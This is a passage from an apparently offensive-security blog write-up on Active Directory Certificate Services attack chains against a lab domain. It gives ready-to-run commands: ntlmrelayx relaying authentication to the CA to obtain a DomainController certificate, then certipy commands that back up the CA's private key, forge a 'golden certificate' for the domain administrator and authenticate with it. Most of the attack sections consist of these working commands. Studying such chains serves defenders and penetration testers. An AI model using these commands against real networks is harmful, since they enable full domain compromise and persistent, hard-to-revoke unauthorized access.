    certutil -config "ca.blog.local\BLOG-CA" -getreg CA\InterfaceFlags
    ```
    
- **Step 1: Set up NTLM Relay Listener** (Targets the DCOM/RPC endpoint).
    
    ```bash
    python3 ntlmrelayx.py -t ca.blog.local -smb2support --adcs-attack --adcs-template "DomainController"
    ```
    
- **Step 2: Authenticate and Exploit** (Use the resulting certificate for privilege escalation).
*This step is typically followed by a tool like `gettgtpkinit.py` or `certipy auth` to gain a TGT for the DC.*

---

## 6. Chain 6: Ultimate Persistence via CA Key Compromise

This chain represents the most severe compromise, using key extraction to establish a permanent, undetectable foothold across the entire domain.

- **Initial Primitive Required:** **ESC12** (Shell Access on the CA). This means the attacker has achieved **Local Administrator** rights on the CA server itself.
- **Goal:** Create a **Golden Certificate** and achieve forest-level access.

### Attack Chain: ESC12 (Shell Access) → Private Key Dump → Golden Certificate (Forgery)

1. **Initial Access (ESC12):** The attacker exploits a vulnerability (e.g., LPE or EternalBlue) to gain **shell access** on the CA server (`ca.blog.local`).
2. **Key Dump (ESC12):** The attacker uses tools like **Certipy** or **Mimikatz** to locate and dump the **CA's signing private key** and certificate from the machine's local store.
3. **Forgery (ESC12):** The attacker uses the stolen CA key to **forge (mint)** a new certificate. This forged certificate can be created for any user (e.g., `administrator@blog.local`) with any validity period, and because it is signed by the legitimate root CA key, **it is trusted by the entire domain, regardless of template security or passwords.**
4. **Persistence:** This forged certificate grants access that is only reversible if the CA certificate is revoked and the root key is regenerated (a massive undertaking).

### Certipy Attack Commands

- **Check Primitive (ESC12):** Confirmation of local shell access on the CA server.
    
    ```bash
    whoami /groups
    ```
    
- **Step 1: Backup/Extract CA Key** (This step requires Local Admin credentials on the CA server).
    
    ```bash
    certipy ca -backup -u administrator@blog.local -p SecurePass -dc-ip 192.168.1.10 -ca 'BLOG-CA' -target ca.blog.local
    ```
    
- **Step 2: Forge Golden Certificate** (Using the extracted `BLOG-CA.pfx` key).
    
    ```bash
    certipy forge -ca-pfx BLOG-CA.pfx -upn administrator@blog.local -out administrator_forged_golden.pfx
    ```
    
- **Step 3: Authenticate:**
    
    ```bash
    certipy auth -pfx administrator_forged_golden.pfx -dc-ip 192.168.1.10 -target blog.local
    ```
---

*Written by F1Z3R — November 2025*
*“We enumerate to understand.”*
